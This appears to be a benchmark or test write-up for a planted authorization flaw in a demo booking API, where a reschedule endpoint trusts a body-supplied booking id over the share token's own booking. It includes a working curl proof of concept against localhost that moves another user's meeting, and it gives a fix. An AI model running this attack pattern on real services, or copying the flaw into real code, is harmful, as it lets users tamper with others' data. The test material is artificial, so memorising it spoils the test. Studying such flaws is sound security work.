# `bola/share-token-confused-deputy` — token validates, target is body-supplied

## The bug

`POST /api/v1/share/{token}/reschedule` correctly validates the share token (expiry,
purpose, used_at). But the booking it then mutates is loaded by `payload.booking_id` —
the request body — not by `link.booking_id`. The token authorizes *some* reschedule;
it doesn't constrain *which* booking. Mallory can use her own valid reschedule token
to move someone else's meeting.

## Why static analysis misses it

The share token is loaded and validated comprehensively. `payload.booking_id` looks
like a normal request field, with a plausible product justification (multi-meeting
reschedule pages). Detection requires reasoning that the token's authorization scope
(`link.booking_id`) must equal the operation's target — a relationship that's not
expressed in any single line of code.

## PoC

Eve plays the attacker. She has a legitimately issued reschedule token of her own
(from any of her hosted bookings). She uses it to reschedule Carol's booking by
passing Carol's booking_id in the request body.

```bash
# Step 1: Eve issues herself a reschedule token from one of her hosted bookings
EVE_TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"eve@acme.test","password":"demo1234"}' \
  | python -c "import sys, json; print(json.load(sys.stdin)['access_token'])")

EVE_OWN_BOOKING=$(curl -s http://127.0.0.1:8000/api/v1/bookings/mine \
  -H "Authorization: Bearer $EVE_TOKEN" \
  | python -c "import sys, json; print(json.load(sys.stdin)[0]['id'])")

EVE_RESCHEDULE_TOKEN=$(curl -s -X POST "http://127.0.0.1:8000/api/v1/bookings/$EVE_OWN_BOOKING/share-links" \
  -H "Authorization: Bearer $EVE_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"purpose":"reschedule"}' \
  | python -c "import sys, json; print(json.load(sys.stdin)['token'])")

# Step 2: Eve obtains Carol's booking_id (e.g., via prior recon — represented here
# by simply logging in as Carol to grab it, since this is a demo)
CAROL_TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"carol@initech.test","password":"demo1234"}' \
  | python -c "import sys, json; print(json.load(sys.stdin)['access_token'])")
VICTIM_ID=$(curl -s http://127.0.0.1:8000/api/v1/bookings/mine \
  -H "Authorization: Bearer $CAROL_TOKEN" \
  | python -c "import sys, json; print(json.load(sys.stdin)[0]['id'])")

# Step 3: Eve uses HER reschedule token but targets Carol's booking
curl -s -X POST "http://127.0.0.1:8000/api/v1/share/$EVE_RESCHEDULE_TOKEN/reschedule" \
  -H 'Content-Type: application/json' \
  -d "{\"booking_id\":$VICTIM_ID,\"new_time\":\"2099-12-31T03:00:00+00:00\"}"
```

Expected (vulnerable): `200`, with the response showing Carol's booking moved to the
2099-12-31 03:00 timestamp.

On `main`: `200`, but the response shows **Eve's** booking moved (the handler ignored
`payload.booking_id` and used `link.booking_id`).

## Fix

Use `link.booking_id` (or `link.booking` via SQLAlchemy relationship) instead of
`payload.booking_id`. Drop `booking_id` from `RescheduleRequest`. If multi-meeting
pages truly need a body-supplied id, verify it equals `link.booking_id`.
